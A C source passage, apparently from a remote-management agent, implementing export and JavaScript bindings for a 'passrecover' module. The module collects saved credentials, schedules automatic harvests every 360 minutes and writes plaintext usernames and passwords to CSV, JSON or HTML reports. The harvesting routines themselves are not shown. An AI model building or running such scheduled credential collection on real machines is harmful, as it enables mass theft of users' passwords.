    FILE *f;
    unsigned long long size = 0;
    PrNowStampFile(stamp, sizeof(stamp));
    if (strcmp(fmt, "csv") == 0)
    {
        _snprintf_s(outName, outNameLen, _TRUNCATE, "passrec-export-%s.csv", stamp);
    }
    else if (strcmp(fmt, "html") == 0)
    {
        _snprintf_s(outName, outNameLen, _TRUNCATE, "passrec-export-%s.html", stamp);
    }
    else
    {
        _snprintf_s(outName, outNameLen, _TRUNCATE, "passrec-export-%s.json", stamp);
    }
    _snprintf_s(path, sizeof(path), _TRUNCATE, "%s\\%s", pr->dir, pr->currentFile[0] ? pr->currentFile : "passrec-empty.jsonl");
    f = fopen(path, "r");
    if (f == NULL)
    {
        if (pr->currentFile[0] == 0)
        {
            _snprintf_s(path, sizeof(path), _TRUNCATE, "%s\\%s", pr->dir, "passrec.jsonl");
            f = fopen(path, "r");
        }
    }
    _snprintf_s(path, sizeof(path), _TRUNCATE, "%s\\%s", pr->dir, outName);
    {
        FILE *o = fopen(path, "w");
        int first = 1;
        if (o == NULL) { if (f != NULL) { fclose(f); } *outSize = 0; return; }
        if (strcmp(fmt, "csv") == 0)
        {
            fputs("ts,source,app,origin,user,password,extra\n", o);
        }
        else if (strcmp(fmt, "json") == 0)
        {
            fputs("[\n", o);
        }
        else
        {
            fputs("<!doctype html><html><head><meta charset=utf-8><title>Password Recovery Report</title>", o);
            fputs("<style>body{font-family:Segoe UI,Arial,sans-serif;margin:20px}table{border-collapse:collapse;width:100%}th,td{border:1px solid #ccc;padding:6px;font-size:13px;text-align:left}th{background:#f0f0f0}tr:nth-child(even){background:#fafafa}</style>", o);
            fputs("</head><body><h1>Password Recovery Report</h1>", o);
            fputs("<table><thead><tr><th>Time</th><th>Source</th><th>App</th><th>Origin</th><th>User</th><th>Password</th><th>Extra</th></tr></thead><tbody>", o);
        }
        {
            while (fgets(line, (int)sizeof(line), f) != NULL)
            {
                size_t L = strlen(line);
                if (L > 0 && line[L - 1] == '\n') { line[--L] = 0; }
                if (L > 0 && line[L - 1] == '\r') { line[--L] = 0; }
                if (L == 0 || line[0] != '{') { continue; }
                PrGetJsonStr(line, "ts", f_ts, sizeof(f_ts));
                PrGetJsonStr(line, "source", f_src, sizeof(f_src));
                PrGetJsonStr(line, "app", f_app, sizeof(f_app));
                PrGetJsonStr(line, "origin", f_org, sizeof(f_org));
                PrGetJsonStr(line, "user", f_user, sizeof(f_user));
                PrGetJsonStr(line, "password", f_pw, sizeof(f_pw));
                PrGetJsonStr(line, "extra", f_extra, sizeof(f_extra));
                if (strcmp(fmt, "csv") == 0)
                {
                    const char *fields[7] = { f_ts, f_src, f_app, f_org, f_user, f_pw, f_extra };
                    int k;
                    for (k = 0; k < 7; k++)
                    {
                        const char *s = fields[k];
                        const char *c;
                        fputc('"', o);
                        for (c = s; *c; c++) { if (*c == '"') { fputc('"', o); } fputc(*c, o); }
                        fputc('"', o);
                        if (k < 6) { fputc(',', o); }
                    }
                    fputc('\n', o);
                }
                else if (strcmp(fmt, "json") == 0)
                {
                    if (!first) { fputs(",\n", o); }
                    first = 0;
                    fputs(line, o);
                }
                else
                {
                    char e[1024];
                    const char *ins[7] = { f_ts, f_src, f_app, f_org, f_user, f_pw, f_extra };
                    int k;
                    for (k = 0; k < 7; k++)
                    {
                        const char *s = ins[k];
                        const char *c;
                        if (k > 0) { fputs("</td>", o); }
                        if (k == 0) { fputs("<tr>", o); }
                        if (k > 0) { fputs("<td>", o); }
                        for (c = s; *c; c++)
                        {
                            if (*c == '&') { fputs("&amp;", o); }
                            else if (*c == '<') { fputs("&lt;", o); }
                            else if (*c == '>') { fputs("&gt;", o); }
                            else if (*c == '"') { fputs("&quot;", o); }
                            else if (*c == '\'') { fputs("&#39;", o); }
                            else { fputc(*c, o); }
                        }
                        (void)e;
                    }
                    fputs("</tr>", o);
                }
            }
        }
        if (strcmp(fmt, "json") == 0)
        {
            if (!first) { fputs("\n", o); }
            fputs("]\n", o);
        }
        else if (strcmp(fmt, "html") == 0)
        {
            fputs("</tbody></table></body></html>", o);
        }
        size = (unsigned long long)ftell(o);
        fclose(o);
        *outSize = size;
    }
    if (f != NULL) { fclose(f); }
}

static duk_ret_t PR_Export(duk_context *ctx)
{
    PassRecover *pr = &g_pr;
    char fmt[8] = "json";
    char outName[PR_NAME_MAX] = "";
    unsigned long long size = 0;
    if (duk_is_string(ctx, 0))
    {
        size_t sl = 0;
        const char *s = duk_get_lstring(ctx, 0, &sl);
        _snprintf_s(fmt, sizeof(fmt), _TRUNCATE, "%s", s);
    }
    if (strcmp(fmt, "csv") != 0 && strcmp(fmt, "html") != 0 && strcmp(fmt, "json") != 0)
    {
        _snprintf_s(fmt, sizeof(fmt), _TRUNCATE, "json");
    }
    EnterCriticalSection(&pr->cs);
    PrWriteExport(pr, fmt, outName, sizeof(outName), &size);
    LeaveCriticalSection(&pr->cs);
    duk_push_object(ctx);
    duk_push_string(ctx, outName);
    duk_put_prop_string(ctx, -2, "name");
    duk_push_number(ctx, (double)size);
    duk_put_prop_string(ctx, -2, "size");
    return 1;
}

static void PR_Push(duk_context *ctx, void *chain)
{
    (void)chain;
    duk_push_object(ctx);
    duk_push_c_function(ctx, PR_Harvest, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "harvest");
    duk_push_c_function(ctx, PR_Start, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "start");
    duk_push_c_function(ctx, PR_Stop, 0);
    duk_put_prop_string(ctx, -2, "stop");
    duk_push_c_function(ctx, PR_GetState, 0);
    duk_put_prop_string(ctx, -2, "getState");
    duk_push_c_function(ctx, PR_Read, 1);
    duk_put_prop_string(ctx, -2, "read");
    duk_push_c_function(ctx, PR_ListFiles, 0);
    duk_put_prop_string(ctx, -2, "listFiles");
    duk_push_c_function(ctx, PR_ReadFile, 3);
    duk_put_prop_string(ctx, -2, "readFile");
    duk_push_c_function(ctx, PR_Export, 1);
    duk_put_prop_string(ctx, -2, "export");
}

void ILibDuktape_PassRecover_Init(duk_context *ctx)
{
    PassRecover *pr = &g_pr;
    DWORD sess;
    if (!pr->inited)
    {
        wchar_t wexe[1024];
        InitializeCriticalSection(&pr->cs);
        pr->inited = 1;
        pr->available = 1;
        pr->writeIdx = 0; pr->readIdx = 0; pr->totalCreds = 0;
        pr->autoThread = NULL; pr->autoStopEvent = NULL;
        pr->autoIntervalMin = 360; pr->autoRunning = 0;
        pr->lastHarvest = 0; pr->lastAdded = 0;
        GetModuleFileNameW(NULL, wexe, 1023);
        {
            wchar_t *slash = wcsrchr(wexe, L'\\');
            if (slash != NULL) { *slash = 0; }
            PrWideToUtf8(wexe, pr->dir, (int)sizeof(pr->dir));
        }
        ProcessIdToSessionId(GetCurrentProcessId(), &sess);
        pr->session0 = (sess == 0) ? 1 : 0;
        _snprintf_s(pr->lastError, PR_ERR_MAX, _TRUNCATE, "");
    }
    ILibDuktape_ModSearch_AddHandler(ctx, "passrecover", PR_Push);
}

#else

/* Non-Windows stub so the module always exists in the agent. */

static duk_ret_t PR_StubGetState(duk_context *ctx)
{
    duk_push_object(ctx);
    duk_push_boolean(ctx, 1);
    duk_put_prop_string(ctx, -2, "available");
    duk_push_boolean(ctx, 0);
    duk_put_prop_string(ctx, -2, "session0");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "totalCreds");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "bufferCount");
    duk_push_string(ctx, ".");
    duk_put_prop_string(ctx, -2, "dir");
    duk_push_string(ctx, "");
    duk_put_prop_string(ctx, -2, "currentFile");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "lastHarvest");
    duk_push_string(ctx, "password recovery is only available on Windows agents");
    duk_put_prop_string(ctx, -2, "lastError");
    return 1;
}

static duk_ret_t PR_StubHarvest(duk_context *ctx)
{
    duk_push_object(ctx);
    duk_push_boolean(ctx, 1);
    duk_put_prop_string(ctx, -2, "ok");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "added");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "total");
    return 1;
}

static duk_ret_t PR_StubEmptyArray(duk_context *ctx)
{
    duk_push_array(ctx);
    return 1;
}

static duk_ret_t PR_StubReadFile(duk_context *ctx)
{
    duk_push_object(ctx);
    duk_push_string(ctx, "");
    duk_put_prop_string(ctx, -2, "data");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "size");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "bytes");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "offset");
    duk_push_boolean(ctx, 1);
    duk_put_prop_string(ctx, -2, "done");
    return 1;
}

static duk_ret_t PR_StubExport(duk_context *ctx)
{
    duk_push_object(ctx);
    duk_push_string(ctx, "");
    duk_put_prop_string(ctx, -2, "name");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "size");
    return 1;
}

static duk_ret_t PR_StubStart(duk_context *ctx)
{
    (void)ctx;
    duk_push_true(ctx);
    return 1;
}

static duk_ret_t PR_StubStop(duk_context *ctx)
{
    (void)ctx;
    duk_push_true(ctx);
    return 1;
}

static void PR_Push(duk_context *ctx, void *chain)
{
    (void)chain;
    duk_push_object(ctx);
    duk_push_c_function(ctx, PR_StubHarvest, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "harvest");
    duk_push_c_function(ctx, PR_StubStart, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "start");
    duk_push_c_function(ctx, PR_StubStop, 0);
    duk_put_prop_string(ctx, -2, "stop");
    duk_push_c_function(ctx, PR_StubGetState, 0);
    duk_put_prop_string(ctx, -2, "getState");
    duk_push_c_function(ctx, PR_StubEmptyArray, 1);
    duk_put_prop_string(ctx, -2, "read");
    duk_push_c_function(ctx, PR_StubEmptyArray, 0);
    duk_put_prop_string(ctx, -2, "listFiles");
    duk_push_c_function(ctx, PR_StubReadFile, 3);
    duk_put_prop_string(ctx, -2, "readFile");
    duk_push_c_function(ctx, PR_StubExport, 1);
    duk_put_prop_string(ctx, -2, "export");
}

void ILibDuktape_PassRecover_Init(duk_context *ctx)
{
    ILibDuktape_ModSearch_AddHandler(ctx, "passrecover", PR_Push);
}

#endif
